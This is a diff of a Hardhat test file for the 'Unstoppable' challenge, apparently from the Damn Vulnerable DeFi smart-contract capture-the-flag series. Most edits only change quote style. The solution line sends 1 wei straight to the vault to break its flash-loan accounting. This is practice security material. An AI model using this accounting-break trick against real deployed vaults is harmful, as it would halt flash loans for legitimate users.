@@ -1,7 +1,7 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Unstoppable', function () {
+describe("[Challenge] Unstoppable", function () {
     let deployer, player, someUser;
     let token, vault, receiverContract;
 
@@ -13,9 +13,9 @@ describe('[Challenge] Unstoppable', function () {
 
         [deployer, player, someUser] = await ethers.getSigners();
 
-        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+        token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy();
         vault = await (
-            await ethers.getContractFactory('UnstoppableVault', deployer)
+            await ethers.getContractFactory("UnstoppableVault", deployer)
         ).deploy(
             token.address,
             deployer.address, // owner
@@ -37,11 +37,11 @@ describe('[Challenge] Unstoppable', function () {
         expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);
 
         // Show it's possible for someUser to take out a flash loan
-        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(vault.address);
+        receiverContract = await (await ethers.getContractFactory("ReceiverUnstoppable", someUser)).deploy(vault.address);
         await receiverContract.executeFlashLoan(100n * 10n ** 18n);
     });
 
-    it('Execution', async function () {
+    it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
         // Directly transfer 1 wei to break accounting
         await token.connect(player).transfer(vault.address, 1);
